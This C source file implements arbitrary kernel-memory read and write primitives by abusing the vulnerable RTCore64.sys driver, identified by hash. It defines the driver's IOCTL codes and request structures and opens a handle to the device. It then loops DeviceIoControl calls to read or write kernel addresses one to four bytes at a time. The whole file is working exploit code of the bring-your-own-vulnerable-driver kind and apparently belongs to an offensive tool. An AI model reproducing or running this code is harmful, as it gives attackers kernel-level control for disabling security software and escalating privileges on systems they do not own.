#include <windows.h>
#include <assert.h>
#include <tchar.h>

#include "PrintFunctions.h"

/*
* "RTCore64.sys" (SHA256: 01AA278B07B58DC46C84BD0B1B5C8E9EE4E62EA0BF7A695862444AF32E87F1FD)
*/

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    DWORD Pad1;
    DWORD Offset;
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    DWORD Pad1;
    DWORD Offset;
    DWORD WriteSize;
    DWORD Value;
    BYTE Pad3[16];
};

static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

static_assert(sizeof(struct RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
static_assert(sizeof(struct RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

HANDLE g_Device_RTCore = INVALID_HANDLE_VALUE;
HANDLE GetDriverHandle_RTCore() {
    if (g_Device_RTCore == INVALID_HANDLE_VALUE) {
        TCHAR service[] = TEXT("\\\\.\\RTCore64");
        HANDLE Device = CreateFile(service, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

        if (Device == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[!] Unable to obtain a handle to the vulnerable driver, exiting...\n"));
            exit(EXIT_FAILURE);
        }
        g_Device_RTCore = Device;
    }

    return g_Device_RTCore;
}

VOID CloseDriverHandle_RTCore() {
    CloseHandle(g_Device_RTCore);
    g_Device_RTCore = INVALID_HANDLE_VALUE;
}



VOID ReadMemoryPrimitive_RTCore(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    while (Size) {
        struct RTCORE64_MEMORY_READ ReadCommand = { 0 };
        ReadCommand.Address = Address;
        if (Size >= 4) {
            ReadCommand.ReadSize = 4;
        }
        else if (Size >= 2) {
            ReadCommand.ReadSize = 2;
        }
        else {
            ReadCommand.ReadSize = 1;
        }
        ReadCommand.Offset = 0;

        DWORD BytesReturned;

        if (Address < 0x0000800000000000) {
            _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
            exit(1);
        }
        if (Address < 0xFFFF800000000000) {
            _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
            exit(1);
        }

        DeviceIoControl(GetDriverHandle_RTCore(),
            RTCORE64_MEMORY_READ_CODE,
            &ReadCommand,
            sizeof(ReadCommand),
            &ReadCommand,
            sizeof(ReadCommand),
            &BytesReturned,
            NULL);

        Address += ReadCommand.ReadSize;
        if (Size >= 4) {
            *(PDWORD)Buffer = (DWORD)ReadCommand.Value;
        }
        else if (Size >= 2) {
            *(PWORD)Buffer = (WORD)ReadCommand.Value;
        }
        else {
            *(PBYTE)Buffer = (BYTE)ReadCommand.Value;
        }
        Size -= ReadCommand.ReadSize;
        Buffer = (PVOID)(((DWORD64)Buffer) + ReadCommand.ReadSize);
    }
}

/*
* RTCore driver allows to write 1, 2 or 4 bytes at a time
*/
VOID WriteMemoryPrimitive_RTCore(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    while (Size) {
        struct RTCORE64_MEMORY_WRITE WriteCommand = { 0 };
        WriteCommand.Address = Address;
        if (Size >= 4) {
            WriteCommand.WriteSize = 4;
            WriteCommand.Value = *(PDWORD)Buffer;
        }
        else if (Size >= 2) {
            WriteCommand.WriteSize = 2;
            WriteCommand.Value = *(PWORD)Buffer;
        }
        else {
            WriteCommand.WriteSize = 1;
            WriteCommand.Value = *(PBYTE)Buffer;
        }
        WriteCommand.Offset = 0;

        DWORD BytesReturned;

        if (Address < 0x0000800000000000) {
            _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
            exit(1);
        }
        if (Address < 0xFFFF800000000000) {
            _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
            exit(1);
        }

        DeviceIoControl(GetDriverHandle_RTCore(),
            RTCORE64_MEMORY_WRITE_CODE,
            &WriteCommand,
            sizeof(WriteCommand),
            &WriteCommand,
            sizeof(WriteCommand),
            &BytesReturned,
            NULL);

        Address += WriteCommand.WriteSize;
        Size -= WriteCommand.WriteSize;
        Buffer = (PVOID)(((DWORD64)Buffer) + WriteCommand.WriteSize);
    }
}

